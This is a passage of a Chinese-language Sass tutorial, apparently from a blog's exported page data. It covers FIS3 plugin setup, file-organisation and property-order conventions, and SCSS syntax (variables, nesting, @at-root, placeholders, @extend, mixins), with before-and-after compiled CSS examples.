class=\"string\">&quot;/images/down-icon.jpg&quot;</span>);</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#f0f</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// @each 示例</span></span><br><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"variable\">$animal-list</span>: puma, sea-slug, egret;</span><br><span class=\"line\"><span class=\"keyword\">@each</span> <span class=\"variable\">$animal</span> in <span class=\"variable\">$animal-list</span> &#123;</span><br><span class=\"line\">    .#&#123;<span class=\"variable\">$animal</span>&#125;-<span class=\"attribute\">icon</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&#x27;/images/#&#123;$animal&#125;.png&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.puma-icon</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/images/puma.png&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.sea-slug-icon</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/images/sea-slug.png&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.egret-icon</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/images/egret.png&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// @for 示例</span></span><br><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"keyword\">@for</span> <span class=\"variable\">$i</span> from <span class=\"number\">1</span> to <span class=\"number\">4</span> &#123;</span><br><span class=\"line\">    <span class=\"selector-class\">.content-</span>#&#123;<span class=\"variable\">$i</span>&#125; &#123;</span><br><span class=\"line\">        <span class=\"attribute\">font-size</span>: &#123;</span><br><span class=\"line\">            font-size: <span class=\"number\">14px</span> + <span class=\"variable\">$i</span> * <span class=\"number\">2px</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.content-1</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.content-2</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">18px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.content-3</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"1、-FIS3-中集成-Sass\"><a href=\"#1、-FIS3-中集成-Sass\" class=\"headerlink\" title=\"1、 FIS3 中集成 Sass\"></a>1、 FIS3 中集成 Sass</h1><h2 id=\"1-1-插件安装\"><a href=\"#1-1-插件安装\" class=\"headerlink\" title=\"1.1 插件安装\"></a>1.1 插件安装</h2><ul>\n<li>sass 编译 <code>npm i fis3-parser-node-sass -g</code></li>\n<li>前缀添加 <code>npm i fis3-preprocessor-cssprefixer -g</code> 必须全局安装</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fis.match(<span class=\"string\">&#x27;*.scss&#x27;</span>, &#123;</span><br><span class=\"line\">    parser: fis.plugin(<span class=\"string\">&#x27;node-sass&#x27;</span>),</span><br><span class=\"line\">    rExt: <span class=\"string\">&#x27;css&#x27;</span>,</span><br><span class=\"line\">    release: <span class=\"string\">&#x27;$0&#x27;</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">fis.match(<span class=\"string\">&#x27;_*.scss&#x27;</span>, &#123;</span><br><span class=\"line\">    release: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">fis.match(<span class=\"string\">&#x27;*.scss&#x27;</span>, &#123;</span><br><span class=\"line\">    preprocessor: fis.plugin(<span class=\"string\">&#x27;cssprefixer&#x27;</span>, &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;browsers&quot;</span>: [<span class=\"string\">&quot;Android &gt;= 2.1&quot;</span>, <span class=\"string\">&quot;iOS &gt;= 4&quot;</span>, <span class=\"string\">&quot;ie &gt;= 8&quot;</span>, <span class=\"string\">&quot;firefox &gt;= 15&quot;</span>],</span><br><span class=\"line\">        <span class=\"string\">&quot;cascade&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-2-目录规范\"><a href=\"#1-2-目录规范\" class=\"headerlink\" title=\"1.2 目录规范\"></a>1.2 目录规范</h2><ul>\n<li>base<ul>\n<li>_reset.scss</li>\n<li>_typography.scss</li>\n</ul>\n</li>\n<li>helpers<ul>\n<li>_function.scss</li>\n<li>_mixin.scss</li>\n<li>_variable.scss</li>\n</ul>\n</li>\n<li>components<ul>\n<li>_header.scss</li>\n<li>_footer.scss</li>\n<li>_buttons.scss</li>\n<li>_cards.scss</li>\n</ul>\n</li>\n<li>layouts<ul>\n<li>_responsive.scss</li>\n</ul>\n</li>\n<li>pages<ul>\n<li>_page1.scss</li>\n<li>_page2.scss</li>\n</ul>\n</li>\n<li>lib<ul>\n<li>bootstrap.scss</li>\n<li>font-awesome.scss</li>\n</ul>\n</li>\n<li>main.scss</li>\n</ul>\n<h2 id=\"1-3-编码规范\"><a href=\"#1-3-编码规范\" class=\"headerlink\" title=\"1.3 编码规范\"></a>1.3 编码规范</h2><h3 id=\"1-3-1-Sass-性能优化\"><a href=\"#1-3-1-Sass-性能优化\" class=\"headerlink\" title=\"1.3.1 Sass 性能优化\"></a>1.3.1 Sass 性能优化</h3><ul>\n<li>用 class 分类代替子代选择器</li>\n<li>建议用子选择器，而不是后代选择器，提高性能</li>\n<li>特殊类别选择属性选择器</li>\n</ul>\n<h3 id=\"1-3-2-Sass-属性声明顺序\"><a href=\"#1-3-2-Sass-属性声明顺序\" class=\"headerlink\" title=\"1.3.2 Sass 属性声明顺序\"></a>1.3.2 Sass 属性声明顺序</h3><ul>\n<li>z-index, display</li>\n<li>position, left, top, right, bottom</li>\n<li>overflow, float, clear</li>\n<li>margin, padding</li>\n<li>background, border</li>\n<li>font, text</li>\n<li>scss 代码块应有的顺序</li>\n</ul>\n<h3 id=\"1-3-2-Sass-使用规则\"><a href=\"#1-3-2-Sass-使用规则\" class=\"headerlink\" title=\"1.3.2 Sass 使用规则\"></a>1.3.2 Sass 使用规则</h3><ul>\n<li>当前选择器的样式属性</li>\n<li>父级选择器的伪类选择器 (<code>:first-letter</code>, <code>:hover</code>, <code>:active</code>)</li>\n<li>伪类元素 (<code>:before</code>、<code>:after</code>)</li>\n<li>父级选择器的声明样式 (<code>.selected</code>, <code>.active</code>, <code>.enlarged</code>)</li>\n<li>用 Sass 的上下文媒体查询</li>\n<li>子选择器作为最后的部分</li>\n</ul>\n<h2 id=\"2、-Sass-语法说明\"><a href=\"#2、-Sass-语法说明\" class=\"headerlink\" title=\"2、 Sass 语法说明\"></a>2、 Sass 语法说明</h2><h3 id=\"2-1-后缀名\"><a href=\"#2-1-后缀名\" class=\"headerlink\" title=\"2.1 后缀名\"></a>2.1 后缀名</h3><ul>\n<li>Sass文件后缀名可为 <code>.scss</code>、 <code>.sass</code></li>\n<li>推荐使用 <code>.scss</code>，与 <code>css</code> 语法完全兼容</li>\n<li>不推荐使用 <code>.sass</code> 要求更严格，不能使用 <code>&#123;&#125;</code> 和 <code>;</code></li>\n</ul>\n<h3 id=\"2-2-文件导入\"><a href=\"#2-2-文件导入\" class=\"headerlink\" title=\"2.2 文件导入\"></a>2.2 文件导入</h3><ul>\n<li>可在 <code>Sass</code> 文件中导入 <code>Sass</code> 文件或 <code>css</code> 文件 （对于 <code>Sass</code> 文件可不写后缀名）</li>\n<li>基础文件以 _ 开头，如变量声明、混入等，（导入时可不写下划线）</li>\n</ul>\n<blockquote>\n<p>示例：</p>\n<ul>\n<li><code>@import &quot;page/page1&quot;</code></li>\n<li><code>@import &quot;lib/bootstrap.css&quot;</code></li>\n</ul>\n</blockquote>\n<h3 id=\"2-3-变量\"><a href=\"#2-3-变量\" class=\"headerlink\" title=\"2.3 变量\"></a>2.3 变量</h3><ul>\n<li>使用 <code>$</code> 声明并使用变量</li>\n<li>变量可被覆盖（就近原则或在变量后面添加 <code>!default</code>）</li>\n<li>变量可为全局或局部 （在选择器外部声明、选择器内部声明）</li>\n<li>当变量为字符串时，可在类名、属性名中引用，如 <code>border-#&#123;$variableName&#125;</code></li>\n<li>变量为 list 结构 （在 <code>$size: 18px 30px 34px</code> 使用 <code>nth($size, 1)</code> 调用）</li>\n<li>变量为 map 结构（使用 <code>@each $key, $value in $map</code> 调用）</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$gray</span>: <span class=\"number\">#666</span> !default;</span><br><span class=\"line\"><span class=\"variable\">$directory</span>: top;</span><br><span class=\"line\"><span class=\"variable\">$size</span>: <span class=\"number\">18px</span> <span class=\"number\">30px</span> <span class=\"number\">34px</span>;</span><br><span class=\"line\"><span class=\"variable\">$heading</span>: (h1: <span class=\"number\">#0aa</span>, h2: <span class=\"number\">#cc0</span>, h3: <span class=\"number\">#b0b</span>);</span><br><span class=\"line\"><span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">font-size</span>: nth(<span class=\"variable\">$size</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"attribute\">color</span>: <span class=\"variable\">$gray</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border</span>-#&#123;<span class=\"variable\">$directory</span>&#125;: <span class=\"number\">1</span> px solid <span class=\"variable\">$gray</span>;</span><br><span class=\"line\">        &amp;<span class=\"selector-pseudo\">:hover</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$font-size</span>: <span class=\"number\">40</span> px;</span><br><span class=\"line\">            <span class=\"attribute\">font-size</span>: <span class=\"variable\">$font-size</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">@each</span> <span class=\"variable\">$head</span>, <span class=\"variable\">$color</span> in <span class=\"variable\">$heading</span> &#123;</span><br><span class=\"line\">        #&#123;<span class=\"variable\">$head</span>&#125; &#123;</span><br><span class=\"line\">            <span class=\"attribute\">color</span>: <span class=\"variable\">$color</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-4-嵌套\"><a href=\"#2-4-嵌套\" class=\"headerlink\" title=\"2.4 嵌套\"></a>2.4 嵌套</h3><ul>\n<li>可使用选择器嵌套、属性嵌套 （属性嵌套并没什么用）</li>\n<li><code>@at-root</code> 可跳出所有的上级选择器 （可同时对过个选择器操作）</li>\n<li><code>#&#123;&amp;&#125;__modifer</code> 可实现 BEM 特性</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.footer</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">    <span class=\"keyword\">@at-root</span> #&#123;&amp;&#125;__modifer &#123;</span><br><span class=\"line\">        <span class=\"attribute\">color</span>: <span class=\"number\">#333</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @at-root .nav &amp; &#123;</span><br><span class=\"line\">        color: <span class=\"number\">#f0f</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">@at-root</span> &#123;</span><br><span class=\"line\">        <span class=\"selector-class\">.child1</span> &#123;</span><br><span class=\"line\">            <span class=\"attribute\">color</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"selector-class\">.child2</span> &#123;</span><br><span class=\"line\">            <span class=\"attribute\">color</span>: <span class=\"number\">#ff0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.footer</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.footer__modifer</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-class\">.footer</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#f0f</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child1</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child2</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#ff0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-4-占位选择器\"><a href=\"#2-4-占位选择器\" class=\"headerlink\" title=\"2.4 占位选择器\"></a>2.4 占位选择器</h3><ul>\n<li>使用 <code>%</code> 声明占位选择器， 通过 <code>@extend</code> 调用占位选择器</li>\n<li>当占位选择器没被调用时，不会被解析出来 （推荐使用）</li>\n<li>占位选择器可以用其定义一些基础的样式文件</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\">% my-sty &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#aaa</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child-1</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">@extend</span> %my-sty;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.child1</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#aaa</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-5-继承\"><a href=\"#2-5-继承\" class=\"headerlink\" title=\"2.5 继承\"></a>2.5 继承</h3><p>说明：继承是建立在语义化的关系上。当一个元素拥有的类（如 <code>.seriousError</code> ）表明它属于另一个类（如 <code>.error</code>），此时适合用继承</p>\n<ul>\n<li>使用 <code>%extend</code> 进行继承</li>\n<li>可以继承任何定义给单个元素的选择器，比如 <code>.special.cool</code>、<code>a:hover</code></li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前</span></span><br><span class=\"line\"><span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-decoration</span>: underline;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.hoverlink</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">@extend</span> <span class=\"attribute\">a</span>: <span class=\"attribute\">hover</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后</span></span><br><span class=\"line\"><span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span>, <span class=\"selector-class\">.hoverlink</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">text-decoration</span>: underline;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前</span></span><br><span class=\"line\"><span class=\"selector-class\">.error</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">@extend</span> .error;</span><br><span class=\"line\">    <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后</span></span><br><span class=\"line\"><span class=\"selector-class\">.error</span>, <span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前</span></span><br><span class=\"line\"><span class=\"selector-class\">.error</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.error</span><span class=\"selector-class\">.intrusion</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/image/hacked.png&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">@extend</span> .error;</span><br><span class=\"line\">    <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后</span></span><br><span class=\"line\"><span class=\"selector-class\">.error</span>, <span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.error</span><span class=\"selector-class\">.intrusion</span>, <span class=\"selector-class\">.intrusion</span><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/image/hacked.png&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-6-混合\"><a href=\"#2-6-混合\" class=\"headerlink\" title=\"2.6 混合\"></a>2.6 混合</h3><p>说明：混合指令用于定义可重复的样式，避免使用无语义的 <code>class</code>，如 <code>.clearfix</code>、<code>.float-left</code></p>\n<ul>\n<li>使用 <code>@mixin</code> 声明混合指令，通过<code> @include</code> 调用混合指令</li>\n<li>当混合没被调用时，不会被解析出来 （推荐使用）</li>\n<li>混合样式中也可以嵌套其他混合样式</li>\n<li>当混合为无参时，推荐使用占位选择器来实现</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"keyword\">@mixin</span> ellipsis (<span class=\"variable\">$width</span>: <span class=\"number\">100px</span>) &#123;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    <span class=\"attribute\">white-space</span>: nowrap;</span><br><span class=\"line\">    <span class=\"attribute\">text-overflow</span>: ellipsis;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"variable\">$width</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.text-ellipsis</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#0ff</span>;</span><br><span class=\"line\">    <span class=\"keyword\">@include</span> ellipsis;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.text2-ellipsis</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#999</span>;</span><br><span class=\"line\">    <span class=\"keyword\">@include</span> ellipsis(<span class=\"variable\">$width</span>: <span class=\"number\">300px</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 